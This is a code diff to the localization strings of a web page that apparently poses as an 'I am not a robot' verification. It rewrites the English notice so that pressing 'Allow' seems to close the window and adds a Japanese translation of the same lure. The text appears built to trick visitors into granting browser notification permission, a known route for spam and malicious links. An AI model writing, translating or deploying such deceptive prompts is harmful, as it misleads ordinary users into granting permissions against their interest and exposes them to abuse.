@@ -25,8 +25,8 @@ window.langs = {
         mid2: "Allow",
         mid3: "to verify, that you are not a robot",
         msg: "You have successfully passed the verification!<br>Now you can close the window.",
-        n_title: "Please Click 'Allow' or Refresh The Page, Visit our Website",
-        n_msg: "We have detected suspicious behavior, please refresh the page and revisit our website.",
+        n_title: "Click 'Allow' to close this window.",
+        n_msg: "This window can be closed by clicking 'Allow'. If you want to continue actions on this site, just click on the detailed information.",
         n_inf: "detailed information"
     },
     fr: {
@@ -120,6 +120,19 @@ window.langs = {
         n_title: "Κάντε κλικ στο 'Επιτρέπεται' για να κλείσετε αυτό το παράθυρο.",
         n_msg: "Αυτό το παράθυρο μπορεί να κλείσει κάνοντας κλικ στο 'Επιτρέπεται'. Εάν θέλετε να συνεχίσετε τις ενέργειες σε αυτόν τον ιστότοπο, απλώς κάντε κλικ στις λεπτομερείς πληροφορίες.",
         n_inf: "λεπτομερείς πληροφορίες"
+    },
+    ja: {
+        top1: "プレス",
+        top2: "許可する",
+        top3: "を確認する。",
+        midTop: "私はロボットではありません",
+        mid1: "プレス",
+        mid2: "許可する",
+        mid3: "あなたがロボットでないことを確認するために",
+        msg: "検証を無事通過しました!<br>これで、ウィンドウを閉じることができます。",
+        n_title: "許可」をクリックして、このウィンドウを閉じます。",
+        n_msg: "このウィンドウは、「許可」をクリックして閉じることができます。このサイトでの操作を継続したい場合は、詳細情報をクリックしてください。",
+        n_inf: "詳細情報"
     }
 };
 
@@ -130,6 +143,8 @@ if (void 0 !== window.navigator && void 0 !== navigator.language) {
 if (!langs[lang]) {
     lang = "en";
 }
+
+
 if (langs[lang]) {
     document.getElementById("top1").innerHTML = langs[lang].top1;
     document.getElementById("top2").innerHTML = langs[lang].top2;
